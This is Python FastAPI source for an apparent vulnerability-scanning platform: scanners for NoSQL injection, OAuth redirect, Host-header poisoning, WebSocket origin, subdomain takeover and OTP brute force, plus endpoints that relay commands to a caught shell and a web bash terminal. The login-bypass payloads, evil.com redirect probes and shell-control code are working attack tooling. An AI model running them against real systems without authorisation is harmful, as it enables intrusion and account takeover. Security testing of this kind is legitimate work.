@app.get("/api/exploit/shell/{lid}/output")
async def exploit_shell_output(lid: str, user=Depends(verify_token)):
    s = EXPLOIT_SESSIONS.get(lid)
    if not s: return {"output": "", "status": "not_found"}
    out = "".join(s.output); s.output = []
    return {"output": out, "status": s.status}


@app.post("/api/exploit/shell/{lid}/cmd")
async def exploit_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
    s = EXPLOIT_SESSIONS.get(lid)
    if not s or not s.writer: return {"error": "No shell connected"}
    try:
        cmd = body.get("cmd", "")
        s.writer.write((cmd + "\n").encode())
        await s.writer.drain()
        return {"sent": True}
    except Exception as e:
        return {"error": str(e)}


@app.post("/api/exploit/shell/{lid}/stop")
async def exploit_shell_stop(lid: str, user=Depends(verify_token)):
    s = EXPLOIT_SESSIONS.pop(lid, None)
    if s:
        try:
            if s.server: s.server.close()
            if s.writer: s.writer.close()
        except: pass
    return {"stopped": True}


# ═══════════════════════════════════════════════════════════════
#  NEW SCANNERS: NoSQL, OAuth, Host Header, WebSocket, Takeover, OTP
# ═══════════════════════════════════════════════════════════════

@app.post("/api/scan/nosql")
async def scan_nosql(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; base = _web_url(req.target)
    login_paths = ["/login", "/api/login", "/api/users", "/api/auth", "/signin", "/api/signin"]
    payloads_get = [
        ("?username[$ne]=invalid&password[$ne]=invalid", "MongoDB $ne operator injection via GET"),
        ("?username[$gt]=&password[$gt]=",               "MongoDB $gt operator injection via GET"),
        ("?user[$regex]=.*&pass[$regex]=.*",             "MongoDB $regex injection via GET"),
    ]
    payloads_post = [
        ({"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}, "MongoDB $ne operator via JSON POST"),
        ({"username": {"$gt": ""},        "password": {"$gt": ""}},        "MongoDB $gt operator via JSON POST"),
        ({"username": "admin",            "password": {"$regex": ".*"}},   "MongoDB $regex password bypass"),
    ]
    for path in login_paths:
        url = base.rstrip("/") + path
        try:
            baseline = _req_lib.get(url, timeout=6, verify=False, headers=_BROWSER_HEADERS)
            b_status = baseline.status_code; b_len = len(baseline.content)
        except: continue
        for qs, desc in payloads_get:
            try:
                r = _req_lib.get(url + qs, timeout=6, verify=False, headers=_BROWSER_HEADERS)
                if r.status_code in (200, 302) and (r.status_code != b_status or len(r.content) > b_len * 1.2):
                    findings.append({"detail": f"NoSQL Injection: {desc} at {path}", "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A", "cwe": "CWE-943", "cwe_name": "NoSQL Injection", "owasp": "A03:2021 - Injection", "remediation": "Validate and sanitize all input. Never pass user input directly as MongoDB query operators. Use allowlisted fields."})
                    break
            except: pass
        for payload, desc in payloads_post:
            try:
                r = _req_lib.post(url, json=payload, timeout=6, verify=False, headers=_BROWSER_HEADERS)
                if r.status_code in (200, 302) and r.status_code != b_status:
                    if any(x in r.text.lower() for x in ["token", "dashboard", "welcome", "success", "redirect"]):
                        findings.append({"detail": f"NoSQL Injection: {desc} at {path} — login bypassed (HTTP {r.status_code})", "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A", "cwe": "CWE-943", "cwe_name": "NoSQL Injection", "owasp": "A03:2021 - Injection", "remediation": "Use parameterized queries or an ODM (Mongoose) with strict schema validation."})
                        break
            except: pass
    for path in ["/search", "/api/search", "/api/users", "/api/products"]:
        url = base.rstrip("/") + path
        try:
            r = _req_lib.get(url + "?q[$regex]=.*", timeout=6, verify=False, headers=_BROWSER_HEADERS)
            if r and any(x in r.text.lower() for x in ["mongodb", "casterror", "bsontype", "mongoose", "$regex", "$ne"]):
                findings.append({"detail": f"NoSQL error disclosure at {path}?q[$regex]=.* — MongoDB internals leaked in response", "severity": "HIGH", "cvss": "7.5", "cve": "N/A", "cwe": "CWE-943", "cwe_name": "NoSQL Injection", "owasp": "A03:2021 - Injection", "remediation": "Suppress MongoDB error messages in production. Validate input types before querying."})
        except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "nosql", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "nosql", "vulnerable": bool(findings), "findings": findings, "total": len(findings), "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/oauth")
async def scan_oauth(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; base = _web_url(req.target)
    oauth_paths = ["/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
                   "/oauth/authorize", "/oauth/token", "/api/oauth", "/connect/authorize",
                   "/auth/oauth", "/oauth2/authorize", "/oauth2/token"]
    saml_paths  = ["/saml/sso", "/saml/consume", "/saml/metadata", "/Shibboleth.sso/SAML2/POST"]
    discovered = []
    for path in oauth_paths + saml_paths:
        r = _http_get(base.rstrip("/") + path, timeout=6)
        if r and r.status_code in (200, 302, 400, 405):
            discovered.append(path)
    if not discovered:
        scan_id = str(uuid.uuid4()); save_scan(scan_id, "oauth", req.target, {"output": "no oauth endpoints"})
        return {"scan_id": scan_id, "target": req.target, "tool": "oauth", "vulnerable": False, "findings": [], "total": 0, "endpoints": [], "timestamp": datetime.datetime.utcnow().isoformat()}
    findings.append({"detail": f"OAuth/SSO endpoints discovered: {', '.join(discovered)}", "severity": "INFO", "cvss": "0.0", "cve": "N/A", "cwe": "N/A", "cwe_name": "Discovery", "owasp": "A01:2021", "remediation": "Ensure all OAuth endpoints are properly secured."})
    for path in [p for p in discovered if "authorize" in p]:
        url = base.rstrip("/") + path
        try:
            r = _req_lib.get(url + "?client_id=test&response_type=code&redirect_uri=https://evil.com&scope=openid",
                             timeout=6, verify=False, headers=_BROWSER_HEADERS, allow_redirects=False)
            loc = r.headers.get("Location", "")
            if "evil.com" in loc:
                findings.append({"detail": f"OAuth redirect_uri manipulation accepted at {path} — server redirected to evil.com", "severity": "CRITICAL", "cvss": "9.3", "cve": "N/A", "cwe": "CWE-601", "cwe_name": "OAuth redirect_uri Manipulation", "owasp": "A01:2021 - Broken Access Control", "remediation": "Strictly whitelist allowed redirect_uri values. Reject any URI not pre-registered."})
        except: pass
        try:
            r = _req_lib.get(url + "?client_id=test&response_type=code&redirect_uri=" + base,
                             timeout=6, verify=False, headers=_BROWSER_HEADERS, allow_redirects=False)
            if r.status_code in (200, 302) and "state" not in r.text.lower() and "csrf" not in r.text.lower():
                findings.append({"detail": f"OAuth {path} may not enforce state parameter — CSRF on OAuth flow possible", "severity": "MEDIUM", "cvss": "6.1", "cve": "N/A", "cwe": "CWE-352", "cwe_name": "CSRF on OAuth Flow", "owasp": "A01:2021", "remediation": "Always validate the state parameter to prevent CSRF attacks on the OAuth flow."})
        except: pass
    for path in [p for p in discovered if "saml" in p.lower()]:
        r = _http_get(base.rstrip("/") + path, timeout=6)
        if r and r.status_code == 200 and any(x in r.text.lower() for x in ["samlp:", "ds:signature", "samlresponse"]):
            findings.append({"detail": f"SAML endpoint at {path} — check for signature wrapping and XXE attacks", "severity": "HIGH", "cvss": "8.8", "cve": "N/A", "cwe": "CWE-347", "cwe_name": "Improper Cryptographic Signature Verification", "owasp": "A02:2021", "remediation": "Validate SAML signatures strictly. Disable DTD parsing to prevent XXE in SAML assertions."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "oauth", req.target, {"output": str(findings)})
    vuln = bool([f for f in findings if f["severity"] != "INFO"])
    return {"scan_id": scan_id, "target": req.target, "tool": "oauth", "vulnerable": vuln, "findings": findings, "total": len(findings), "endpoints": discovered, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/hostheader")
async def scan_hostheader(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; base = _web_url(req.target)
    parsed = urlparse(base); real_host = parsed.netloc or parsed.path; evil_host = "evil-attacker.com"
    host_tests = [
        ({"Host": evil_host},                                   "Host header"),
        ({"Host": real_host, "X-Forwarded-Host": evil_host},   "X-Forwarded-Host header"),
        ({"Host": real_host, "X-Host": evil_host},             "X-Host header"),
        ({"Host": real_host, "X-Forwarded-Server": evil_host}, "X-Forwarded-Server header"),
        ({"Host": real_host, "X-HTTP-Host-Override": evil_host},"X-HTTP-Host-Override header"),
    ]
    for extra_hdrs, desc in host_tests:
        try:
            r = _req_lib.get(base, headers={**_BROWSER_HEADERS, **extra_hdrs}, timeout=8, verify=False, allow_redirects=False)
            body = r.text.lower()
            loc  = r.headers.get("Location", "")
            if evil_host in loc:
                findings.append({"detail": f"Host Header Injection via {desc} — redirect to '{evil_host}' (cache poisoning / open redirect)", "severity": "CRITICAL", "cvss": "9.1", "cve": "N/A", "cwe": "CWE-644", "cwe_name": "Host Header Injection / Cache Poisoning", "owasp": "A03:2021 - Injection", "remediation": "Strictly validate Host header. Never redirect based on its value."})
            elif evil_host in body:
                ctx = body[max(0, body.find(evil_host)-40):body.find(evil_host)+60]
                sev = "HIGH" if any(w in ctx for w in ["href", "src", "action", "canonical", "url", "link"]) else "MEDIUM"
                findings.append({"detail": f"Host Header Injection via {desc} — '{evil_host}' reflected in response (password reset poisoning risk)", "severity": sev, "cvss": "7.5" if sev == "HIGH" else "5.4", "cve": "N/A", "cwe": "CWE-644", "cwe_name": "Host Header Injection", "owasp": "A03:2021 - Injection", "remediation": "Never use the Host header to build URLs. Use a hardcoded trusted hostname."})
        except: pass
    for path in ["/forgot-password", "/reset-password", "/account/recover", "/password-reset"]:
        url = base.rstrip("/") + path
        try:
            r = _req_lib.get(url, headers={**_BROWSER_HEADERS, "Host": evil_host, "X-Forwarded-Host": evil_host},
                             timeout=6, verify=False, allow_redirects=False)
            if r.status_code in (200, 302) and evil_host in r.text:
                findings.append({"detail": f"Password Reset Poisoning at {path} — reset email could contain attacker-controlled link", "severity": "CRITICAL", "cvss": "9.8", "cve": "N/A", "cwe": "CWE-640", "cwe_name": "Weak Password Recovery Mechanism", "owasp": "A07:2021 - Identification and Authentication Failures", "remediation": "Use a hardcoded base URL for reset emails. Never derive it from the Host header."})
        except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "hostheader", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "hostheader", "vulnerable": bool(findings), "findings": findings, "total": len(findings), "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/websocket")
async def scan_websocket(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; base = _web_url(req.target)
    parsed = urlparse(base); host = parsed.netloc or parsed.path
    ws_paths = ["/ws", "/websocket", "/socket.io", "/socket", "/chat", "/live", "/api/ws", "/api/socket", "/realtime"]
    discovered_ws = []
    for path in ws_paths:
        url = base.rstrip("/") + path
        ws_hdrs = {"Upgrade": "websocket", "Connection": "Upgrade",
                   "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                   "Sec-WebSocket-Version": "13", "Host": host}
        try:
            r = _req_lib.get(url, headers=ws_hdrs, timeout=6, verify=False, allow_redirects=False)
            if r.status_code == 101 or "websocket" in r.headers.get("Upgrade", "").lower():
                if path not in discovered_ws: discovered_ws.append(path)
        except: pass
        r2 = _http_get(url, timeout=5)
        if r2 and r2.status_code == 200 and any(x in r2.text.lower() for x in ["socket.io", "websocket", '"type":"connect"']):
            if path not in discovered_ws: discovered_ws.append(path)
    for path in discovered_ws:
        url = base.rstrip("/") + path
        try:
            r = _req_lib.get(url, headers={"Upgrade": "websocket", "Connection": "Upgrade",
                                           "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                                           "Sec-WebSocket-Version": "13",
                                           "Origin": "https://evil-attacker.com", "Host": host},
                             timeout=6, verify=False, allow_redirects=False)
            if r.status_code == 101:
                findings.append({"detail": f"WebSocket at {path} accepts arbitrary origins — missing Origin validation", "severity": "HIGH", "cvss": "8.1", "cve": "N/A", "cwe": "CWE-346", "cwe_name": "Origin Validation Error", "owasp": "A01:2021 - Broken Access Control", "remediation": "Validate the Origin header on WebSocket handshake. Only accept connections from trusted origins."})
        except: pass
        if base.startswith("http://"):
            findings.append({"detail": f"Unencrypted WebSocket (ws://) at {path} — data transmitted in plaintext", "severity": "MEDIUM", "cvss": "5.9", "cve": "N/A", "cwe": "CWE-319", "cwe_name": "Cleartext Transmission of Sensitive Information", "owasp": "A02:2021 - Cryptographic Failures", "remediation": "Use wss:// (WebSocket Secure) instead of ws://."})
    if discovered_ws:
        findings.insert(0, {"detail": f"WebSocket endpoints discovered: {', '.join(discovered_ws)}", "severity": "INFO", "cvss": "0.0", "cve": "N/A", "cwe": "N/A", "cwe_name": "Discovery", "owasp": "N/A", "remediation": "Review WebSocket security configuration."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "websocket", req.target, {"output": str(findings)})
    vuln = bool([f for f in findings if f["severity"] != "INFO"])
    return {"scan_id": scan_id, "target": req.target, "tool": "websocket", "vulnerable": vuln, "findings": findings, "total": len(findings), "endpoints": discovered_ws, "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/takeover")
async def scan_takeover(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    import dns.resolver, dns.exception
    findings = []; base = _web_url(req.target)
    parsed = urlparse(base); apex_domain = parsed.hostname or ""
    if not apex_domain:
        scan_id = str(uuid.uuid4())
        return {"scan_id": scan_id, "target": req.target, "tool": "takeover", "vulnerable": False, "findings": [], "total": 0, "timestamp": datetime.datetime.utcnow().isoformat()}
    common_subs = ["www","mail","remote","blog","webmail","server","ns1","ns2","smtp","secure","vpn","m",
                   "shop","ftp","api","dev","staging","test","portal","admin","app","cdn","static","assets"]
    takeover_fingerprints = {
        "github.io":          ["there isn't a github pages site here", "404 - file or directory not found"],
        "amazonaws.com":      ["nosuchbucket", "the specified bucket does not exist"],
        "s3-website":         ["nosuchbucket", "no such bucket"],
        "herokuapp.com":      ["no such app", "heroku | no such app"],
        "azurewebsites.net":  ["404 web site not found"],
        "fastly.net":         ["fastly error: unknown domain"],
        "netlify.app":        ["not found - request id"],
        "myshopify.com":      ["sorry, this shop is currently unavailable"],
        "zendesk.com":        ["this is your help center"],
        "surge.sh":           ["project not found"],
        "bitbucket.io":       ["repository not found"],
        "pantheonsite.io":    ["the site you were looking for couldn't be found"],
    }
    subdomains_to_check = [f"{s}.{apex_domain}" for s in common_subs]
    subdomains_to_check.insert(0, apex_domain)
    for subdomain in subdomains_to_check[:20]:
        try:
            try:
                answers = dns.resolver.resolve(subdomain, "CNAME")
                cname_target = str(answers[0].target).lower().rstrip(".")
            except Exception:
                cname_target = None
            if not cname_target: continue
            for svc, fingerprints in takeover_fingerprints.items():
                if svc in cname_target:
                    r = _http_get(f"http://{subdomain}", timeout=8)
                    if r:
                        body = r.text.lower()
                        for fp in fingerprints:
                            if fp.lower() in body:
                                findings.append({"detail": f"Subdomain Takeover: {subdomain} → CNAME {cname_target} ({svc}) shows '{fp}'", "severity": "CRITICAL", "cvss": "9.3", "cve": "N/A", "cwe": "CWE-923", "cwe_name": "Subdomain Takeover", "owasp": "A05:2021 - Security Misconfiguration", "remediation": f"Remove the DNS CNAME for {subdomain} or claim the resource at {cname_target}."})
                                break
                    else:
                        findings.append({"detail": f"Potential Subdomain Takeover: {subdomain} → CNAME {cname_target} ({svc}) — service not responding", "severity": "HIGH", "cvss": "8.1", "cve": "N/A", "cwe": "CWE-923", "cwe_name": "Subdomain Takeover", "owasp": "A05:2021", "remediation": f"Remove CNAME for {subdomain} or claim the {svc} resource."})
                    break
        except Exception: continue
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "takeover", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "takeover", "vulnerable": bool(findings), "findings": findings, "total": len(findings), "timestamp": datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/otp")
async def scan_otp(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; base = _web_url(req.target)

    # SPA baseline: probe a random non-existent path. If the server returns 200
    # with substantial content, it's serving an SPA index.html for every route.
    # We compare candidate endpoint responses against this baseline to reject
    # the OS Angular/React fallback that masquerades as "endpoint exists".
    spa_baseline_len = 0
    spa_baseline_text = ""
    is_spa = False
    try:
        _probe = _http_get(base.rstrip("/") + "/__vulnuslab_probe_" + uuid.uuid4().hex[:10], timeout=5)
        if _probe and _probe.status_code == 200 and len(_probe.text) > 200:
            is_spa = True
            spa_baseline_len = len(_probe.text)
            spa_baseline_text = _probe.text[:500]
    except Exception:
        pass

    def _looks_like_spa_fallback(resp_text: str) -> bool:
        if not is_spa or not resp_text: return False
        if abs(len(resp_text) - spa_baseline_len) < max(50, spa_baseline_len * 0.05):
            return True
        if resp_text[:500] == spa_baseline_text:
            return True
        return False

    otp_paths = ["/otp", "/verify", "/2fa", "/mfa", "/totp", "/api/otp", "/api/verify",
                 "/api/2fa", "/api/mfa", "/auth/otp", "/auth/2fa", "/verify-otp", "/confirm"]
    discovered_otp = []
    for path in otp_paths:
        r = _http_get(base.rstrip("/") + path, timeout=5)
        if not r: continue
        if r.status_code in (302, 400, 405, 422):
            discovered_otp.append(path)
        elif r.status_code == 200 and not _looks_like_spa_fallback(r.text):
            discovered_otp.append(path)
    for path in discovered_otp:
        url = base.rstrip("/") + path
        statuses = []
        sample_text = ""
        for otp_val in ["000000", "111111", "222222", "333333", "444444"]:
            try:
                r = _req_lib.post(url, json={"otp": otp_val, "code": otp_val, "token": otp_val},
                                  timeout=5, verify=False, headers=_BROWSER_HEADERS)
                statuses.append(r.status_code)
                if not sample_text: sample_text = r.text
            except: statuses.append(0)
        # If POST replies still match SPA fallback, this isn't a real OTP endpoint
        if _looks_like_spa_fallback(sample_text): continue
        rate_limited = any(s in (429, 423, 503) for s in statuses)
        if not rate_limited and statuses.count(200) >= 3:
            findings.append({"detail": f"OTP endpoint {path} has no rate limiting — brute force possible ({statuses.count(200)}/5 attempts returned 200)", "severity": "HIGH", "cvss": "7.5", "cve": "N/A", "cwe": "CWE-307", "cwe_name": "Improper Restriction of Excessive Authentication Attempts", "owasp": "A07:2021 - Identification and Authentication Failures", "remediation": "Implement rate limiting (max 5 attempts). Lock out after failures. Use TOTP (RFC 6238)."})
        try:
            r1 = _req_lib.post(url, json={"otp": "123456", "code": "123456"}, timeout=5, verify=False, headers=_BROWSER_HEADERS)
            r2 = _req_lib.post(url, json={"otp": "123456", "code": "123456"}, timeout=5, verify=False, headers=_BROWSER_HEADERS)
            if r1.status_code == r2.status_code == 200 and r1.text == r2.text and not _looks_like_spa_fallback(r1.text):
                findings.append({"detail": f"OTP reuse possible at {path} — same OTP accepted twice (no single-use enforcement)", "severity": "MEDIUM", "cvss": "6.5", "cve": "N/A", "cwe": "CWE-294", "cwe_name": "Authentication Bypass by Capture-Replay", "owasp": "A07:2021", "remediation": "Invalidate OTP immediately after first use. Store used OTPs until expiry window passes."})
        except: pass
        try:
            r = _req_lib.post(url, json={"otp": "000000"}, timeout=5, verify=False, headers=_BROWSER_HEADERS)
            if ('"success":false' in r.text or '"valid":false' in r.text) and not _looks_like_spa_fallback(r.text):
                findings.append({"detail": f"OTP endpoint {path} returns JSON boolean in response — potential response manipulation attack", "severity": "MEDIUM", "cvss": "5.9", "cve": "N/A", "cwe": "CWE-807", "cwe_name": "Reliance on Untrusted Inputs in a Security Decision", "owasp": "A07:2021", "remediation": "Validate OTP server-side only. Do not rely on client-side response parsing for access control."})
        except: pass
    for path in ["/backup-codes", "/recovery-codes", "/api/backup-codes", "/account/backup-codes"]:
        r = _http_get(base.rstrip("/") + path, timeout=5)
        if r and r.status_code == 200 and not _looks_like_spa_fallback(r.text):
            findings.append({"detail": f"Backup/recovery codes endpoint at {path} accessible without apparent authentication", "severity": "HIGH", "cvss": "7.5", "cve": "N/A", "cwe": "CWE-288", "cwe_name": "Authentication Bypass Using Alternate Path", "owasp": "A07:2021", "remediation": "Require authentication and re-authentication before exposing backup codes."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "otp", req.target, {"output": str(findings)})
    return {"scan_id": scan_id, "target": req.target, "tool": "otp", "vulnerable": bool(findings), "findings": findings, "total": len(findings), "endpoints": discovered_otp, "timestamp": datetime.datetime.utcnow().isoformat()}


# ═══════════════════════════════════════════════════════════════
#  BROWSER TERMINAL  (bash session per user)
# ═══════════════════════════════════════════════════════════════
_TERM_SESSIONS: dict = {}

class _TermSession:
    def __init__(self, sid):
        self.sid  = sid
        self.proc = None
        self.buf  = []

@app.post("/api/terminal/create")
async def terminal_create(user=Depends(verify_token)):
    sid = str(uuid.uuid4())
    s = _TermSession(sid)
    s.proc = await asyncio.create_subprocess_exec(
        "/bin/bash", "--norc", "--noprofile",
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
        env={**os.environ, "TERM": "xterm-256color", "PS1": "kali$ "},
    )
    _TERM_SESSIONS[sid] = s
    return {"session_id": sid, "ok": True}

@app.post("/api/terminal/input")
async def terminal_input(body: dict, user=Depends(verify_token)):
    sid = body.get("session_id", "")
    s   = _TERM_SESSIONS.get(sid)
    if not s or not s.proc:
        return {"error": "no session"}
    try:
        s.proc.stdin.write((body.get("input", "") + "\n").encode())
        await s.proc.stdin.drain()
        await asyncio.sleep(0.5)
        try:
            while True:
                data = await asyncio.wait_for(s.proc.stdout.readline(), timeout=0.25)
                if not data: break
                s.buf.append(data.decode("utf-8", errors="replace"))
        except asyncio.TimeoutError:
            pass
    except Exception as e:
        return {"error": str(e)}
    return {"ok": True}

@app.post("/api/terminal/output")
async def terminal_output(body: dict, user=Depends(verify_token)):
    sid = body.get("session_id", "")
    s   = _TERM_SESSIONS.get(sid)
    if not s:
        return {"output": "", "error": "no session"}
    out = "".join(s.buf); s.buf = []
    return {"output": out, "ok": True}

@app.post("/api/terminal/close")
async def terminal_close(body: dict, user=Depends(verify_token)):
    sid = body.get("session_id", "")
    s   = _TERM_SESSIONS.pop(sid, None)
    if s:
        try: s.proc.kill()
        except: pass
    return {"ok": True}
